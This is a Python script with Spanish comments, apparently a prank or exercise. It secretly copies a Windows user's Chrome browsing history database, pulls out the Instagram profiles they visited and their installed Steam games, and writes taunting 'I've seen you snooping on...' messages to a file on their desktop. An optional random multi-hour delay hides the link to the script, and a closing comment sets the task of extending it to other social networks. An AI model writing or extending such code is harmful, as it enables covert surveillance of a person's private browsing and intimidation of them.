import glob
import os
import re
import sqlite3
from pathlib import Path
from shutil import copyfile
from random import randrange
from time import sleep

HACKER_FILE_NAME = "Pruebameeee.txt"


def get_user_path():
    return "{}/".format(Path.home())


def check_steam_games(hacker_file):
    games = []
    steam_path = "C:\\Program Files (x86)\\Steam\\steamapps\\common\\*"
    games_paths = glob.glob(steam_path)
    os.path.getatime(games_paths[0])
    games_paths.sort(key=os.path.getatime, reverse=True)
    for game_path in games_paths:
        games.append(game_path.split("\\")[-1])
    hacker_file.write("\nHe visto que juegas a estos juegos {} \njajajja".format("\n".join(games)))


def delay_action():
    hours_g = randrange(7200, 10800)  # Generador de segundos
    # -------------------------------------Se convierten de seg a horas para que el usuario pueda ver la correcta conversión
    print("Durmiendo {} horas ".format((hours_g/60)/60.))
    sleep(hours_g)


def create_hacker_file(user_path):
    hacker_file = open(user_path + "OneDrive/Escritorio/" +
                       HACKER_FILE_NAME, "w")
    hacker_file.write("Traviesillo heee 7u7\n\n")
    print("se ha creado el archivo con exito")
    return hacker_file


def get_chrome_history(user_path):
    urls = None
    while not urls:
        try:
            history_path = user_path + "AppData/Local/Google/Chrome/User Data/Default/History"
            temp_history = history_path + "temp"
            copyfile(history_path,temp_history)
            connecting = sqlite3.connect(temp_history)#Esto nos permite que aunque estemos dentro de google chrome y este bloque la base de datos, este nos permita obsevar en el temp la información termporal del historial
            cursor = connecting.cursor()
            cursor.execute(
                "SELECT title, last_visit_time, url FROM urls ORDER BY  last_visit_time DESC")
            urls = cursor.fetchall()
            print("las urls se han obtenido")
            connecting.close()
            return urls
        except sqlite3.OperationalError:
            print("Historial inaccesible, reintentando en 3 segundos")
            sleep(3)


def check_history_instagram_profiles(hacker_file, chrome_history):
    profiles_visited = []
    for items in chrome_history:
        results = re.findall(
            "https://www.instagram.com/([A-Za-z0-9_.-]+)/+$", items[2])
        if results and results[0] not in ["fer_leonfranco"]:  # FILTRO
            profiles_visited.append(results[0])
    hacker_file.write("He visto que has estado husmeando en los perfiles de {}...".format(
        ", ".join(profiles_visited)))


def main():

    # delay_action()
    # Calculamos la rusta del usuario de windows
    user_path = get_user_path()
    # Recojemos el historial de google chrome, mientras este se pueda
    chrome_history = get_chrome_history(user_path)
    # Creamos un archivo en el escritorio
    hacker_file = create_hacker_file(user_path)
    # Excribiendo mensajes de miedo
    check_history_instagram_profiles(hacker_file, chrome_history)
    # Ver en el terminal
    check_steam_games(hacker_file)


if __name__ == "__main__":
    main()


# LAS TAREAS SON HACER LO MISMO QUE CON INSTAGRAM PERO COMO OTARS REDES SOCIALES QUE YO CONSIDERE OPTIMAS
def pastiempo():
    pass
